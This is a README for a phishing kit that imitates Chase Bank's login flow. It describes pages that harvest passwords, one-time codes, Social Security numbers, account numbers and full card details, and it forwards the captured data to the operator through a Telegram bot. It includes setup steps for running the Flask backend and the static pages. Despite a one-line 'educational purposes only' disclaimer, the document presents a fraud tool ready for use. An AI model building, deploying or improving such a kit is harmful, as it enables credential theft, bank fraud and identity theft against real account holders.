# FOREXNOVA Phishing Application

A multi-step phishing application that mimics Chase Bank login flow with OTP verification, identity confirmation, and card details collection.

## Features

- **Multi-step verification flow**: Login → OTP → Identification → Card Details → Dashboard
- **New York cityscape background** on login page
- **Glass-morphism design** with modern UI
- **Real-time data capture** and logging
- **Telegram bot integration** for notifications
- **Responsive design** for mobile and desktop

## Setup Instructions

### 1. Install Python Dependencies

```bash
pip install -r requirements.txt
```

### 2. Configure Telegram Bot (Optional)

1. Create a Telegram bot using [@BotFather](https://t.me/botfather)
2. Get your bot token
3. Get your chat ID (send a message to your bot and check `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`)
4. Update `BOT_TOKEN` and `CHAT_ID` in `backend.py`

### 3. Start the Backend Server

```bash
python backend.py
```

The Flask server will start on `http://127.0.0.1:5001`

### 4. Start the Frontend Server

```bash
python -m http.server 8000
```

The static files will be served on `http://127.0.0.1:8000`

### 5. Access the Application

Open your browser and navigate to:
- **Login Page**: `http://127.0.0.1:8000/web/chase_login.html`
- **Dashboard**: `http://127.0.0.1:8000/web/dashboard.html`

## Application Flow

1. **Login Page** (`chase_login.html`): Collects username and password with New York background
2. **OTP Verification** (`otp.html`): 6-digit OTP code verification with 5-minute timer
3. **Identification** (`identification.html`): SSN and account number collection
4. **Card Details** (`card-details.html`): Comprehensive card and personal information
5. **Dashboard** (`dashboard.html`): Final page showing captured user details with home icon

## Security Note

⚠️ **This application is for educational purposes only. Do not use for malicious activities.**

## Technologies Used

- **Frontend**: HTML5, CSS3, Vanilla JavaScript
- **Backend**: Python Flask with CORS
- **Communication**: RESTful APIs with JSON
- **Notifications**: Telegram Bot API
- **Styling**: Custom CSS with glass-morphism effects

## File Structure

```
my_app/
├── backend.py              # Flask API server
├── requirements.txt        # Python dependencies
├── README.md              # This file
└── web/
    ├── chase_login.html   # Login page with New York background
    ├── otp.html           # OTP verification page
    ├── identification.html # Identity verification page
    ├── card-details.html  # Card details collection page
    └── dashboard.html     # Final dashboard with user details
```
